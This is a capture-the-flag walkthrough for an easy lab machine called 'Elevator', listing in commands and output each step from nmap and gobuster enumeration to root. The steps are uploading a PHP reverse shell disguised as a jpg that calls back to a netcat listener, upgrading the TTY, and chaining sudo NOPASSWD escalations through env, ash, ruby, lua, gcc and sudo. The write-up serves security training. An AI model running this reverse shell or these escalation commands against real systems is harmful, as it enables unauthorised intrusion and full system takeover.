# Elevator Machine

**Level:** Easy

**Author:** [beafn28](https://www.linkedin.com/in/beatriz-fresno-naumova-3797b931b/)

------------------
## Scanning & Enumeration 

We perform a general scan with **nmap** on the victim machine's IP to identify the open ports. 

```shell
sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 172.17.0.2
________________________________________________
PORT   STATE SERVICE REASON
80/tcp open  http    syn-ack ttl 64
```

Next, we use **nmap** default scripts to gather more information about the discovered ports:

```shell
nmap -sCV -p80 172.17.0.2
________________________________________________
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.62 ((Debian))
|_http-server-header: Apache/2.4.62 (Debian)
|_http-title: El Ascensor Embrujado - Un Misterio de Scooby-Doo
```

We access the website to inspect its content:

![image](https://github.com/user-attachments/assets/638d5eea-f884-48ff-a8a7-81d2d60049f3)

![image](https://github.com/user-attachments/assets/a4b792c1-8d57-4eb1-b3a4-6dac127a1c68)

![image](https://github.com/user-attachments/assets/09a22ca9-37fc-497b-82bc-6aa3b6855238)

After reviewing the page code and interacting with it, we found relevant information such as usernames: **daphne**, **velma**, **scooby**, **shaggy**

We perform **fuzzing** using **gobuster**:

```shell
gobuster dir -u http://172.17.0.2/ -w /usr/share/seclists/Discovery/Web-Content/common.txt -t 20 -x html,php,txt -s 200,301 -b ''
---------------------------------------------------------------------------------
/index.html           (Status: 200) [Size: 5647]
/javascript           (Status: 301) [Size: 313] [--> http://172.17.0.2/javascript/]
/themes               (Status: 301) [Size: 309] [--> http://172.17.0.2/themes/]
```

We identified the **javascript** and **themes** directories. After reviewing them, we encountered an unauthorized error and performed further **fuzzing**:

```shell
gobuster dir -u http://172.17.0.2/themes/ -w /usr/share/seclists/Discovery/Web-Content/common-and-spanish.txt -t 20 -x html,php,txt -b '' -s 200,301
---------------------------------------------------------------------------------
/archivo.html         (Status: 200) [Size: 3380]
/upload.php           (Status: 200) [Size: 0]
/uploads              (Status: 301) [Size: 317] [--> http://172.17.0.2/themes/uploads/]
```

We discovered the **archivo.html** and **upload.php** files and the **uploads** directory.

--------------
## Explotation

On reviewing the **archivo.html** page, we realized the form allows **jpg** uploads:

![image](https://github.com/user-attachments/assets/55b5577e-1995-4d60-97eb-15fe5b20ac0f)

We prepare the [PHP Pentester monkey reverse shell](https://www.revshells.com/PHP%20PentestMonkey?ip=172.17.0.1&port=4444&shell=%2Fbin%2Fbash&encoding=%2Fbin%2Fbash) and save it as a **jpg** file. 

Note that we set the **172.17.0.1** as the **IP** and **4444** as the **PORT** for the listener.

```shell
wget -O reverse.jpg 'https://www.revshells.com/PHP%20PentestMonkey?ip=172.17.0.1&port=4444&shell=%2Fbin%2Fbash&encoding=%2Fbin%2Fbash'
Saving to: ‘reverse.jpg’
reverse.jpg [ <=> ]   2.53K  --.-KB/s    in 0s      
2024-12-26 21:09:41 (5.82 MB/s) - ‘reverse.jpg’ saved [2590]
```
![image](https://github.com/user-attachments/assets/1872f317-00b9-48e5-ba2c-9710558af290)

![image](https://github.com/user-attachments/assets/7b56e3c0-1b5c-43c2-87eb-4d40213b32b8)

We start a **listener** for the reverse shell using **netcat**: 

```shell
nc -lvnp 4444 
-------------------------------------------------------------------
listening on [any] 4444 ...
```

Next, we execute the **reverse shell** by uploading the **jpg** file through the **upload.php** link, gaining a shell on the victim's machine:

```shell
connect to [172.17.0.1] from (UNKNOWN) [172.17.0.2] 43592
Linux 36ae1fa1a512 6.6.9-amd64 #1 SMP PREEMPT_DYNAMIC Kali 6.6.9-1kali1 (2024-01-08) x86_64 GNU/Linux
 02:37:38 up  6:20,  0 user,  load average: 0.10, 0.10, 0.09
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
bash: cannot set terminal process group (25): Inappropriate ioctl for device
bash: no job control in this shell
www-data@36ae1fa1a512:/$ 
```
------------------------------
### TTY configuration

We configure the **TTY** for comfortable operation on the console:

```shell
script /dev/null -c bash 
```
After pressing **Ctrl  +  Z**, execute:

```shell
stty raw -echo; fg
reset xterm
stty rows 35 columns 156
export TERM=xterm
export SHELL=bash
```

Adjust **rows** and **columns** to match the attacker's screen dimensions:

```shell
stty size
```

Now you can use **Ctrl+L** to clear the screen and **Ctrl+C** as needed.


------------------------------
## Privileges escalation

We use **sudo -l** to check if we can execute anything as **root**:

```shell
sudo -l
------------------------------------------------
User www-data may run the following commands on 36ae1fa1a512:
    (daphne) NOPASSWD: /usr/bin/env
```

We can run **env** as the **daphne** user using [GTFOBins for env](https://gtfobins.github.io/gtfobins/env/#sudo)

```shell
sudo -u daphne env /bin/bash
```

Repeat the **sudo -l** command to escalate privileges step by step until achieving root access:

```shell
sudo -l
------------------------------------------------
User daphne may run the following commands on 36ae1fa1a512:
    (vilma) NOPASSWD: /usr/bin/ash
```


```shell
sudo -u vilma ash
```

```shell
sudo -l
------------------------------------------------
User vilma may run the following commands on 36ae1fa1a512:
    (shaggy) NOPASSWD: /usr/bin/ruby
```

[GTFOBins for ruby](https://gtfobins.github.io/gtfobins/ruby/#sudo)

```shell
sudo -u shaggy ruby -e 'exec "/bin/bash"'
```

```shell
sudo -l
------------------------------------------------
User shaggy may run the following commands on 36ae1fa1a512:
    (fred) NOPASSWD: /usr/bin/lua
```

[GTFOBins for lua](https://gtfobins.github.io/gtfobins/lua/#sudo)

```shell
sudo -u fred lua -e 'os.execute("/bin/bash")'
```

```shell
sudo -l
------------------------------------------------
User fred may run the following commands on 36ae1fa1a512:
    (scooby) NOPASSWD: /usr/bin/gcc
```

[GTFOBins for gcc](https://gtfobins.github.io/gtfobins/gcc/#sudo)

```shell
sudo -u scooby gcc -wrapper /bin/bash,-s .
```

```shell
sudo -l
------------------------------------------------
User scooby may run the following commands on 36ae1fa1a512:
    (root) NOPASSWD: /usr/bin/sudo
```

[GTFOBins for sudo](https://gtfobins.github.io/gtfobins/sudo/#sudo)

```shell
sudo sudo /bin/bash
```

Finally, we gain root access:

```shell
whoami
----------------
root
```
